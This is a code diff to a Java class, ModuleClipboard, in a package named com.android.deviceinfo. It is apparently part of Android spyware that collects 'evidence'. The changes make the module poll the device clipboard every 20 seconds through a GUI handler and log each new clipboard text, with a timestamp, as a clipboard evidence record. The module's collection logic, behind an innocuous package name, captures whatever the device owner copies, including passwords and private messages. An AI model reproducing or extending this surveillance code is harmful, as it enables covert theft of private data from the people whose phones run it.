@@ -19,6 +19,7 @@ import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
 import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.evidence.EvidenceType;
+import com.android.deviceinfo.gui.AGUI;
 import com.android.deviceinfo.interfaces.IncrementalLog;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
@@ -33,50 +34,83 @@ public class ModuleClipboard extends BaseModule implements IncrementalLog {
 	ClipboardManager clipboardManager;
 	static String lastClip = ""; //$NON-NLS-1$
 
-	EvidenceReference logIncremental;
-
 	@Override
 	public void actualStart() {
-		logIncremental = new EvidenceReference(EvidenceType.CLIPBOARD);
-		clipboardManager = (ClipboardManager) Status.getAppContext().getSystemService(Context.CLIPBOARD_SERVICE);
-		if (Cfg.DEBUG) {
-			Check.ensures(clipboardManager != null, "Null clipboard manager"); //$NON-NLS-1$
-		}
+
 	}
 
 	@Override
 	public void actualStop() {
 		clipboardManager = null;
-		logIncremental.close();
 	}
 
 	@Override
 	public boolean parse(ConfModule conf) {
-		setPeriod(5000);
+		setPeriod(20000);
 		return true;
 	}
 
 	@Override
 	public void actualGo() {
+		AGUI gui = Status.getAppGui();
+		
+		gui.handler.post(new Runnable() {
+			@Override
+			public void run() {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (run) fireAdminIntent");
+				}
 
-		final String ret = clipboardManager.getText().toString();
+				realGo();
+			}
+		});
+	}
+	
+	private void realGo() {
+		String ret = null;
+		
+		clipboardManager = (ClipboardManager) Status.getAppContext().getSystemService(Context.CLIPBOARD_SERVICE);
+		
+		if (Cfg.DEBUG) {
+			Check.ensures(clipboardManager != null, "Null clipboard manager"); //$NON-NLS-1$
+		}
+		
+		if (clipboardManager == null) {
+			return;
+		}
+		
+		CharSequence cs = clipboardManager.getText();
+		
+		if (cs == null)
+			return;
+		
+		ret = cs.toString();
+		
 		if (ret != null && !ret.equals(lastClip)) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (go): captured " + ret);//$NON-NLS-1$
 			}
+			
+			// Questo log non e' piu incrementale
 			saveEvidence(ret);
+			
 			lastClip = ret;
 		}
 	}
 
 	private void saveEvidence(String ret) {
-
 		final byte[] tm = (new DateTime()).getStructTm();
 		final byte[] payload = WChar.getBytes(ret.toString(), true);
 		final byte[] process = WChar.getBytes("", true); //$NON-NLS-1$
 		final byte[] window = WChar.getBytes("", true); //$NON-NLS-1$
-
 		final ArrayList<byte[]> items = new ArrayList<byte[]>();
+		
+		EvidenceReference logIncremental;
+		
+		synchronized (this) {
+			logIncremental = new EvidenceReference(EvidenceType.CLIPBOARD);
+		}
+		
 		items.add(tm);
 		items.add(process);
 		items.add(window);
@@ -86,20 +120,19 @@ public class ModuleClipboard extends BaseModule implements IncrementalLog {
 		if (Cfg.DEBUG) {
 			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
 		}
+		
 		synchronized (this) {
 			logIncremental.write(items);
+			logIncremental.close();
 		}
-
 	}
 
 	public synchronized void resetLog() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (resetLog)");
 		}
-		if (logIncremental.hasData()) {
-			logIncremental.close();
-			logIncremental = new EvidenceReference(EvidenceType.CLIPBOARD);
-		}
+
+		// Do nothing, this log is not incremental anymore
 	}
 
 }
